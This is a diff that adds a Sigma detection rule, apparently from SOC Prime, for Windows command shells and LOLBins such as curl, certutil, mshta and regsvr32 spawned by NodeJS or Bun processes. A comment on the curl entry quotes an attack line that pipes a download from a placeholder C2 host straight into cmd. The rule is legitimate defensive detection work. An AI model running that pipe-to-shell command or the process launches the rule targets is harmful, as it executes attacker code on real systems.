@@ -1,0 +1,94 @@
+id: NPTTDPoay6hl
+name: Suspicious NodeJS Child Processes [Windows] (via cmdline)
+body: |-
+  title: Suspicious NodeJS Child Processes [Windows] (via cmdline)
+  id: 878fb007-972d-46a7-8ce3-d050642cf7d0
+  status: stable
+  description: This rule is designed to identify suspicious activities involving NodeJS child processes initiated through the command line. It is highly recommended to baseline your activity and tune out common business use cases.
+  author: SOC Prime Team
+  references:
+      - https://research.jfrog.com/post/beyond-testmetest-42-hijacked-github-repos/
+      - https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
+      - https://asec.ahnlab.com/en/95516/
+      - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
+      - https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography
+      - https://www.sophos.com/en-us/blog/2607_agents_vs_telemetry
+      - https://socket.dev/blog/axios-npm-package-compromised
+      - https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-CVE-2025-66478-next/
+      - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
+      - https://www.fortinet.com/blog/threat-research/stealit-campaign-abuses-nodejs-single-executable-application
+      - https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2025/
+      - https://redcanary.com/blog/threat-intelligence/mocha-manakin-nodejs-backdoor/
+      - https://www.greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild-what-the-greynoise-observation-grid-is-seeing-so-far
+      - https://socket.dev/blog/stegabin-26-malicious-npm-packages-use-pastebin-steganography
+      - https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/
+  tags:
+      - attack.execution
+      - attack.t1059.001
+      - attack.t1059.003
+      - attack.t1059.006
+  logsource:
+      category: process_creation
+      product: windows
+  detection:
+      selection:
+          ParentImage|endswith:
+              - 'node.exe'
+              - 'bun.exe'
+          Image|endswith:
+              - 'cmd.exe' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography; https://asec.ahnlab.com/en/95516/
+              - 'powershell.exe' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/; https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
+              - 'wscript.exe'
+              - 'cscript.exe' #https://socket.dev/blog/axios-npm-package-compromised
+              - 'curl.exe' # malware download https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; curl -s https://<C2>/api/w | cmd
+              - 'bitsadmin.exe'
+              - 'certutil.exe'
+              - 'mshta.exe'
+      selection_vars:
+          - Image|contains|all:
+              - '\python'
+              - '.exe'
+          - CommandLine|contains|all:
+              - 'reg'
+              - ' add '
+          - CommandLine|contains|all:
+              - 'wmic'
+              - ' create '
+          - CommandLine|contains:
+              - 'wscript'
+              - 'cscript'
+              - 'wget '
+              - 'wget.exe'
+              - 'schtasks'
+              - 'curl'
+              - 'bitsadmin'
+              - 'forfiles'
+              - 'hh.exe'
+              - 'msbuild'
+              - 'mshta'
+              - 'regasm'
+              - 'regsvcs'
+              - 'runonce'
+              - 'msiexec'
+              - 'regsvr32'
+              - 'cmd'
+      filters:
+          - CommandLine|contains|all:
+              - 'Adobe'
+              - 'CCXProcess'
+          - CommandLine|contains|all:
+              - 'git'
+              - 'config'
+          - CommandLine|contains|all:
+              - 'taskkill'
+              - '/pid'
+          #CommandLine|contains|all:
+          #    - '\Program Files'
+          #    - 'schtasks'
+      condition: (selection and selection_vars) and not filters
+  falsepositives:
+      - It is highly recommended to baseline your activity and tune out common business use cases.
+  level: medium
+level: medium
+created: '2025-06-19T06:49:14Z'
+updated: '2026-10-26T12:24:06.641000Z'
